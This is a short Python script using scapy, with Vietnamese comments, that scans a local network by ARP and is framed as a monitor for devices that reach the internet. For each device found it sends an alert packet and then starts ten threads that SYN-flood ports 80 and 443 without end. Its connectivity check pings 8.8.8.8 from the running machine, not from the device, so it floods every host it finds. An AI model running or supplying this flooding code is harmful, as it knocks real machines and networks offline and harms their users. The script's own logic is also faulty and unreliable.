import scapy.all as scapy
import os
import threading
import time

# Cấu hình
NETWORK_RANGE = "192.168.1.0/24"  # Phạm vi mạng LAN của bạn
SERVER_IP = "192.168.1.100"  # Địa chỉ IP máy chủ giám sát
ALERT_PORT = 8080  # Cổng cho thông báo cảnh báo
DDOS_THREADS = 10  # Số luồng DDoS

def scan_network():
    arp_request = scapy.ARP(pdst=NETWORK_RANGE)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    client_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        client_list.append(client_dict)
    return client_list

def check_internet_connection(ip):
    try:
        # Kiểm tra kết nối với một máy chủ công cộng
        scapy.sr1(scapy.IP(dst="8.8.8.8")/scapy.ICMP(), timeout=1, verbose=False)
        return True
    except:
        return False

def send_alert(ip):
    # Gửi cảnh báo đến máy chủ giám sát
    try:
        scapy.send(scapy.IP(dst=SERVER_IP)/scapy.TCP(dport=ALERT_PORT, flags="S"), verbose=False)
        print(f"[!] Alert: {ip} connected to the internet!")
    except:
        print("[!] Failed to send alert.")

def ddos_attack(ip):
    # Tấn công DDoS bằng cách gửi các gói SYN lũ lụt
    for _ in range(DDOS_THREADS):
        threading.Thread(target=send_syn_flood, args=(ip,)).start()

def send_syn_flood(ip):
    while True:
        scapy.send(scapy.IP(dst=ip)/scapy.TCP(dport=80, flags="S"), verbose=False)
        scapy.send(scapy.IP(dst=ip)/scapy.TCP(dport=443, flags="S"), verbose=False)

def monitor_network():
    while True:
        client_list = scan_network()
        for client in client_list:
            if check_internet_connection(client["ip"]):
                send_alert(client["ip"])
                ddos_attack(client["ip"])
        time.sleep(10)  # Quét lại sau mỗi 10 giây

if __name__ == "__main__":
    monitor_network()